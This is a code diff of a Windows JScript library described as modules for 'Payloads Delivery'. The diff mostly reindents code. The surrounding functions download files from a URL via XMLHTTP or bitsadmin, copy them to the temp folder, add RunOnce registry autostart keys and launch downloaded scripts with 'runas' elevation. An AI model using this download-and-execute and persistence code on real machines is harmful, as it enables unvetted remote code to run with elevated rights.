@@ -3,8 +3,44 @@
 * LIB_FUNC.JS
 * This file contain main modules for Payloads Delivery
 *
+* Revision 1.0.0.2 (Base Release). Must be always present!
+*
 ******************************************************************************/
 
+
+/***********************************************************
+'
+' CheckIfFileOrFolderExist
+'
+' The Script Checks If Folder or File on it is present
+'
+' PARAMETERS:	strFile - a checcking file
+'		strFolder - a full path to checking folder
+' RETURNS:	0 if File and Folder are Present
+'		1 if Folder not File is Present
+'		2 if File or Folder areh'n Present
+' *********************************************************/
+function CheckIfFileOrFolderExist( strFile, strFolder ) {
+	var fso, strFullName;
+	fso = new ActiveXObject("Scripting.FileSystemObject");
+	if(fso.FolderExists(strFolder))	{
+		if( strFile === "" ){
+			return 1;
+		}
+		else {
+			strFullName = strFolder + "\\" + strFile;
+			if( fso.FileExists( strFullName ) ) {
+				return 0;
+			}
+			else {
+				return 1;
+			}
+		}
+	}
+	else {
+		return 2;
+	}
+}
 
 /******************************************************************************
 '
@@ -63,10 +99,10 @@ function CreatedRunOnceKey(strPath, strBatCmd){
     strFail = "The key " + strBatCmd + " at RunOnce Registry section was NOT Created\n";
     // Run The Function
     if( !CreateRunOnceKey(strPath, strBatCmd) )
-     WScript.Echo( strSuccess );
- else
-     WScript.Echo( strFail );
-}
+	WScript.Echo( strSuccess );
+    else
+	WScript.Echo( strFail );
+ }
 
 /******************************************************************************
 '
@@ -109,11 +145,11 @@ function CreateTwocascadeFolders(strDisk, strFolder1, strFolder2){
         fsoCreateResult = fso.CreateFolder(strPath);
         if( fsoCreateResult != null )
 	// Folder Created
-blnEnableCreated = true;
-else
-    blnEnableCreated = false;
-}
-strPath = strPath + "\\" + strFolder2;
+            blnEnableCreated = true;
+        else
+            blnEnableCreated = false;
+    }
+    strPath = strPath + "\\" + strFolder2;
     // Check if strDisk\strFolder1\strFolder2 Path is Exist
     if( blnEnableCreated & !fso.FolderExists(strPath) )
     {
@@ -121,11 +157,11 @@ strPath = strPath + "\\" + strFolder2;
         fsoCreateResult = fso.CreateFolder(strPath);
         if( fsoCreateResult != null )
 	// Folder Created
-blnEnableCreated = true;
-else
-    blnEnableCreated = false;
-}
-return blnEnableCreated;
+            blnEnableCreated = true;
+        else
+            blnEnableCreated = false;
+    }
+    return blnEnableCreated;
 }
 
 /******************************************************************************
@@ -149,9 +185,9 @@ function CreatedCascade(strDisk, strFolder1, strFolder2){
     strFail = "Fail to Create Cascade on Error\n";
     // Run Functions
     if( CreateTwocascadeFolders(strDisk, strFolder1, strFolder2) )
-     WScript.Echo( strSuccess );
- else
-     WScript.Echo( strFail );
+	WScript.Echo( strSuccess );
+    else
+	WScript.Echo( strFail );
 }
 
 /******************************************************************************
@@ -189,13 +225,13 @@ function UploadFilesFromInt(strFile, strURL, strPath){
     strFileURL = strURL + strFile;
     // Define Full Local Path to be Downloaded
     strLocal_Path = strPath + "\\" + strFile;
-    
+	
     // Check if Path is Exist
     if(fso.FolderExists(strPath))
-     intUploadFilesFromInt = 0;
- else
-     intUploadFilesFromInt = 1;
- 
+	intUploadFilesFromInt = 0;
+    else
+	intUploadFilesFromInt = 1;
+	
     // Downloaded File
     // Open URL (Get Requiest)
     xmlHttp.Open( "GET", strFileURL, false );
@@ -205,15 +241,15 @@ function UploadFilesFromInt(strFile, strURL, strPath){
     xmlHttp.Send();
     if( xmlHttp.Status == 200 && intUploadFilesFromInt == 0)
     // If Send Request is Successful 
-blnExistRemoteFile = true;
-else
-{
-    blnExistRemoteFile = false;
-    intUploadFilesFromInt = 2;
-    xmlHttp.Abort();
-}
-if( blnExistRemoteFile )
-{
+        blnExistRemoteFile = true;
+    else
+    {
+        blnExistRemoteFile = false;
+        intUploadFilesFromInt = 2;
+        xmlHttp.Abort();
+    }
+    if( blnExistRemoteFile )
+    {
         // Set AdoStream Type mode and Open It
         adoStream.Type = 1;
         adoStream.Mode = 3;
@@ -232,8 +268,8 @@ if( blnExistRemoteFile )
 	if(!fso.FileExists(strLocal_Path) && intUploadFilesFromInt == 0 )
 		intUploadFilesFromInt = 1;
 	// /Check if File Downloaded
-}
-return intUploadFilesFromInt;
+    }
+    return intUploadFilesFromInt;
 }
 
 /******************************************************************************
@@ -270,20 +306,20 @@ function UploadFilesFromInt01(strFile, strURL, strPath, intTimeOut)
     // String Manipulations
     strFileURL = strURL + strFile;
     strLocal_Path = strPath + "\\" + strFile;
-    
+	
     // Check if Path is Exist
     if(fso.FolderExists(strPath))
-     intUploadFilesFromInt = 0;
- else
-     intUploadFilesFromInt = 1;
- 
+	intUploadFilesFromInt = 0;
+    else
+	intUploadFilesFromInt = 1;
+	
     // Downloaded File
     var envVarProccess;
     var pathCmd, strSysPath, strParam;
     // Set Current Environment Variables Settings
     envVarProccess = wshShell.Environment("PROCESS");
     // Set Path to Command Shell %SystemRoot%\System32\
-    
+	
     pathCMD = envVarProccess("SystemRoot") + "\\System32\\";
     // Set bitsadmin.exe Full Path Name
     strSysPath = pathCMD + "bitsadmin.exe";
@@ -295,10 +331,10 @@ function UploadFilesFromInt01(strFile, strURL, strPath, intTimeOut)
 //    setTimeout( DoNothing, intTimeOut );
     // Stop Script on intTimeOut miliseconds for Wait if  Bitsadmin done 
     WScript.Sleep( intTimeOut );
-    
+		
     // Check If File Downloaded
-    if(!fso.FileExists(strLocal_Path) && intUploadFilesFromInt == 0 )
-      intUploadFilesFromInt = 1;
+	if(!fso.FileExists(strLocal_Path) && intUploadFilesFromInt == 0 )
+		intUploadFilesFromInt = 1;
     // /Check if File Downloaded
     return intUploadFilesFromInt;
 }
@@ -323,14 +359,14 @@ function UploadedFilesFromInt(strFile, strURL, strPath){
     switch( iResult )
     {
         case 0:
-        WScript.Echo( strSuccess );
-        break;
+            WScript.Echo( strSuccess );
+			break;
         case 1:
-        WScript.Echo( strFail );
-        break;
+            WScript.Echo( strFail );
+			break;
         case 2:
-        WScript.Echo( strURLFail );
-        break;
+            WScript.Echo( strURLFail );
+			break;
     }
 }
 
@@ -353,13 +389,13 @@ function UploadedFilesFromInt01(strFile, strURL, strPath, intTimeOut){
     iResult = UploadFilesFromInt01(strFile, strURL, strPath, intTimeOut)
     switch( iResult )
     {
-     case 0:
-     WScript.Echo( strSuccess );
-     break;
-     case 1:
-     WScript.Echo( strFail );
-     break;
- }
+	case 0:
+        WScript.Echo( strSuccess );
+	    break;
+	case 1:
+		WScript.Echo( strFail );
+		break;
+    }
 }
 
 function DoNothing(){
@@ -438,7 +474,7 @@ function RunedDownloadedScript(strPath, strVBS, intTimeOut){
  * The Script Contains a Function to Manipulate by
  * a Registry in JScript Files
  *
- **/
+**/
 
 /***
  *
@@ -503,20 +539,20 @@ function RunedDownloadedScript(strPath, strVBS, intTimeOut){
  * @return 	true if registry key exists
  *
  **/
- function envProcExists ( key ) {
-     var wshShell, wshEcvirProc;
-     var key2;
-     try{
-      wshShell = new ActiveXObject("WScript.Shell");
-      wshEcvirProc = wshShell.Environment("PROCESS");
-      key2 = wshEcvirProc( key );
-      if( key2 === "" ) return false;
-  }
-  catch( err )
-  {
-      return false;
-  }
-  return true;
+function envProcExists ( key ) {
+	var wshShell, wshEcvirProc;
+	var key2;
+	try{
+		wshShell = new ActiveXObject("WScript.Shell");
+		wshEcvirProc = wshShell.Environment("PROCESS");
+		key2 = wshEcvirProc( key );
+		if( key2 === "" ) return false;
+	}
+	catch( err )
+	{
+		return false;
+	}
+	return true;
 }
 
 /***
@@ -528,23 +564,23 @@ function RunedDownloadedScript(strPath, strVBS, intTimeOut){
  * @return 	NONE
  *
  **/
- function testEnvProcExists ( key ) {
-     var value, wshShell, wshEcvirPro;
-     if( envProcExists( key ) ) {
-      WScript.Echo( "Environment variable: " + key + " is exists.");
-      wshShell = new ActiveXObject("WScript.Shell");
-      wshEcvirProc = wshShell.Environment("PROCESS");
-      value = wshEcvirProc( key );
-      if( value === "" ) {
-       WScript.Echo( "Warning! Value of the Variable not Set.");
-   }
-   else {
-       WScript.Echo( "Value of the Variable: " + value );
-   }
-}
-else {
-  WScript.Echo( "Wrong Environment Variable: " + key  );
-}
+function testEnvProcExists ( key ) {
+	var value, wshShell, wshEcvirPro;
+	if( envProcExists( key ) ) {
+		WScript.Echo( "Environment variable: " + key + " is exists.");
+		wshShell = new ActiveXObject("WScript.Shell");
+		wshEcvirProc = wshShell.Environment("PROCESS");
+		value = wshEcvirProc( key );
+		if( value === "" ) {
+			WScript.Echo( "Warning! Value of the Variable not Set.");
+		}
+		else {
+			WScript.Echo( "Value of the Variable: " + value );
+		}
+	}
+	else {
+		WScript.Echo( "Wrong Environment Variable: " + key  );
+	}
 }
 
 /******************************************************************************
@@ -571,7 +607,7 @@ function testRunDownloadedScript(strPath, strVBS, intTimeOut ){
     strValue = constRun_VBS +"\"" + strPath + "\\" + strVBS + "\"" + constOpt;
     shApp.ShellExecute( "C:\\WINDOWS\\System32\\wscript.exe", strValue, strPath, "runas", 1 );
 //    setTimeout( DoNothing, intTimeOut );
-WScript.Sleep(intTimeOut);
+    WScript.Sleep(intTimeOut);
 }
 
 /* *****************************************************************************
@@ -582,7 +618,7 @@ WScript.Sleep(intTimeOut);
 ' PARAMETERS:   NONE
 ' RETURNS:      Path For User Variable %TEMP% if Success
 '               "C:\Windows\Temp" if API Error
-'				"" if General System Error
+'				"" if General Sysytem Error
 '
 ' *****************************************************************************/
 function getTempEnviron() {
@@ -665,7 +701,7 @@ function Copy_File_Temp( thread_VBS, local_Path ){
 	// Set Full Current File Path Name
 	tempFolder = getTempEnviron();
 	if( tempFolder === "" ) return 1
-     Current_File = tempFolder + "\\" + thread_VBS;
+	Current_File = tempFolder + "\\" + thread_VBS;
 	// Set Full Target File Path Name
 	Target_File = local_Path + "\\" + thread_VBS;
 	if( !fso.FolderExists( local_Path ) ) return 1;
@@ -894,25 +930,4 @@ function CheckIfFolderVariableDefined (strVar) {
     }
     return 2;
 }
-
-/*
-function HelloWorld01Exec()
-{
-	var tempPath, fso, bFlag;
-	// Define ActiveX Object
-	fso = new ActiveXObject( "Scripting.FileSystemObject" );
-	bFlag = 1;
-	tempPath = getTempEnviron();
-	if( tempPath !== "" ){
-		bFlag = Copy_File( strFileNameHello, tempPath );
-		if( bFlag == 0 ){
-			bFlag = Copy_File_Temp( strFileNameHello, "C:" );
-			if( bFlag == 0 ){
-				RunDownloadedExe( "C:", strFileNameHello, 90000)
-			}
-		}
-	}
-	return bFlag;
-}
-*/
 
